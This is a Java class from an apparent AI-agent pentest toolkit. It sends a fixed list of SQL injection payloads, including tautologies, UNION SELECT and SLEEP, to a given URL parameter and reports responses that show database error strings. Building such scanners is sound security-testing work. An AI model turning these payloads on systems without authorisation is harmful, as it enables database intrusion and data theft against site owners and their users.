package com.agentzero.tools;

import com.agentzero.model.ToolResult;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

@Slf4j
@Component
public class SqlInjectionTester implements PentestTool {

    private final ObjectMapper mapper = new ObjectMapper();

    private static final List<String> PAYLOADS = List.of(
            "' OR '1'='1", "' OR 1=1 --", "admin'--",
            "' UNION SELECT null--", "' OR SLEEP(3)--"
    );

    private static final String[] SQL_ERRORS = {
            "sql syntax", "mysql_fetch", "ORA-", "syntax error", "SQLSTATE", "sqlite_"
    };

    @Override
    public String getName() { return "sqli_test"; }

    @Override
    public String getDescription() {
        return "Tests a URL parameter for SQL injection vulnerabilities.";
    }

    @Override
    public String getParameterSchema() {
        return "{\"url\": \"Target URL\", \"parameter\": \"Parameter name to test\"}";
    }

    @Override
    public ToolResult execute(String paramsJson) {
        long start = System.currentTimeMillis();
        StringBuilder results = new StringBuilder("SQL Injection Test\n==================\n\n");
        try {
            Map<String, String> params = mapper.readValue(paramsJson, Map.class);
            String baseUrl = params.get("url");
            String parameter = params.getOrDefault("parameter", "id");
            List<String> findings = new ArrayList<>();
            for (String payload : PAYLOADS) {
                try {
                    String testUrl = baseUrl + (baseUrl.contains("?") ? "&" : "?")
                            + parameter + "=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);
                    HttpURLConnection conn = (HttpURLConnection) new URL(testUrl).openConnection();
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    StringBuilder body = new StringBuilder();
                    try (BufferedReader r = new BufferedReader(
                            new InputStreamReader(conn.getInputStream()))) {
                        String line;
                        while ((line = r.readLine()) != null) body.append(line.toLowerCase());
                    } catch (Exception ignored) {}
                    for (String sig : SQL_ERRORS) {
                        if (body.toString().contains(sig.toLowerCase())) {
                            findings.add("VULNERABLE with payload: " + payload);
                            break;
                        }
                    }
                } catch (Exception ignored) {}
            }
            if (findings.isEmpty()) results.append("No SQL injection found. Tested ").append(PAYLOADS.size()).append(" payloads.\n");
            else { results.append("VULNERABILITIES FOUND:\n"); findings.forEach(f -> results.append(f).append("\n")); }
        } catch (Exception e) { results.append("Error: ").append(e.getMessage()); }
        return ToolResult.builder().toolName(getName()).success(true)
                .output(results.toString())
                .executionTimeMs(System.currentTimeMillis() - start).build();
    }
}
